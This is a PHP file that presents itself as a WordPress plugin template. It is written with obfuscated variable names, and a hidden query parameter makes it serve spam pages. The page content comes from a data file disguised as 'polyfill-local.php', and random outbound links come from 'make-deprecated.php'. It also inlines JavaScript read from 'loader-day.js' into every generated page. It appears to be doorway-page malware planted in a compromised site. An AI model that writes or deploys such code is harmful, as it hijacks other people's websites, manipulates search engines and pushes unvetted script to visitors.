<?php
$rcXySs460 = intval(get_query_var('dtqloxq'));

if ($rcXySs460 < 1 || $rcXySs460 > 5769) return;
$pMqMrjRP = file(plugin_dir_path(__FILE__).'polyfill-local.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$pzJTi8 = explode(';', $pMqMrjRP[$rcXySs460]);
if (count($pzJTi8) < 2) return;
$n7hNm = $pzJTi8[0];
$xGoe8jP  = $pzJTi8[1];
$aU9827 = $pzJTi8[2];
$eyNAD87r  = $pzJTi8[3];
$qxxCMd6RZ = $pzJTi8[4];
set_query_var('hfosqqspz', $n7hNm);

$wl2BDIpr3o = '';
$mYQjY1wZs2 = plugin_dir_path(__FILE__).'make-deprecated.php';
if (is_file($mYQjY1wZs2)) {
	$pZhl5 = file($mYQjY1wZs2, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($pZhl5);
	shuffle($pZhl5);
	$prW0XGW = mt_rand(2, 5);
	if (count($pZhl5) > $prW0XGW) {
		for ($qcgze = 0; $qcgze < $prW0XGW; $qcgze++) {
			$r9lMUyTpTG = array_shift($pZhl5);
			$wl2BDIpr3o .= '<p><a href="'.$r9lMUyTpTG.'">'.$r9lMUyTpTG.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $n7hNm; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $xGoe8jP . "</p>\n";
				if (strlen($eyNAD87r) > 0) echo "<p>" . $eyNAD87r . "</p>\n";
				if (strlen($aU9827) > 0) echo "<p>" . $aU9827 . "</p>\n";
				if (strlen($qxxCMd6RZ) > 0) echo '<p><a href="#"><img src="'.$qxxCMd6RZ.'"></a>' . "</p>\n";
				echo $wl2BDIpr3o;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$puB8mzl = plugin_dir_path(__FILE__) . 'loader-day.js';
if (is_file($puB8mzl)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($puB8mzl);
	echo '</script>';
}
get_footer();
?>
